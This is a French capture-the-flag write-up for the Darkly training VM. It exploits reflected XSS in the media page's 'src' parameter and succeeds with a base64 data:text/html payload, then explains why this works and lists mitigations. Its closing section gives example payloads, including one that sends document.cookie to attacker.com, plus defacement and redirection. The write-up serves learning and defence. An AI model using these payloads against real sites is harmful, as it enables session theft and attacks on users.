Exploitation XSS (Reflected XSS) sur Darkly (Paramètre src)

Objectif : Exploiter une vulnérabilité XSS dans le paramètre src de la page media 

URL cible : http://192.168.1.33/?page=media&src=<value>

Analyse initiale

    La page media utilise le paramètre src pour inclure et afficher des ressources externes via des balises HTML comme <object>.
        <object data="test"></object>

    En inspectant l'application, aucune validation ou filtrage des entrées utilisateur sur ce paramètre n'a été détectée.

    Hypothèse : il est possible d'injecter un script dans ce paramètre pour exécuter un XSS (Cross-Site Scripting).

=>Injection initiale

    Une première tentative avec un script simple dans le paramètre src :

    http://192.168.1.33/?page=media&src=<script>alert('XSS')</script>

    Résultat : La balise <script> est ignorée ou filtrée. L'attaque échoue.

=>Utilisation d’une balise <object>

    Hypothèse : la page media utilise des balises comme <object> pour afficher le contenu spécifié dans src.
    Tentative avec une balise <object> :

    <object data="javascript:alert('XSS')"></object>

    Résultat : Cette méthode échoue également car certains navigateurs ou configurations désactivent javascript: dans data.

=>>>>Injection via data:text/html

    Le schéma data:text/html permet d'injecter directement du contenu HTML ou JavaScript encodé dans une URL.

    Encodage en Base64 du payload suivant :

<script>alert('XSS')</script>

Encodé en Base64 : PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

Construction de l'URL avec le schéma data:text/html :

http://192.168.1.33/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K

Résultat : Succès. Le flag est là!

The flag is: 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac41

----------------------------------------------------------------------------
Pourquoi data:text/html fonctionne-t-il ?

    Le schéma data: permet d'insérer directement des données dans une ressource HTML ou une balise.
    Le contenu encodé en Base64 est interprété comme du HTML par la balise <object>.
    Dans ce cas, aucun filtrage ou validation n'est appliqué par l'application, permettant l'exécution du code JavaScript.

Pourquoi l'encodage Base64 ?

    L'encodage Base64 aide à contourner certains filtres ou pare-feu en masquant les caractères dangereux (<, >, ").
    Lorsqu'il est utilisé avec le schéma data:, il permet une injection discrète et directe de contenu.
----------------------------------------------------------------------------

Mesures de sécurité

    Validation des entrées :
        Rejeter toute entrée contenant des schémas non autorisés (data:, javascript:).
        Rejeter tout contenu contenant des caractères potentiellement dangereux (<, >, ", ', ;, etc.).
        Utiliser des whitelists pour autoriser uniquement des valeurs spécifiques.

    Encodage des sorties :
        Encoder toutes les données utilisateur avant de les insérer dans une page web.

    CSP (Content Security Policy) :
        Empêcher l'exécution de scripts externes ou injectés.

----------------------------------------------------
Impact des XSS

    Vol de cookies et de sessions :
        Exemple : <script>document.write('<img src="http://attacker.com?c='+document.cookie+'">');</script>
    Défacement de page :
        Exemple : <script>document.body.innerHTML="Hacked by Attacker";</script>
    Redirection :
        Exemple : <script>window.location.href="http://attacker.com";</script>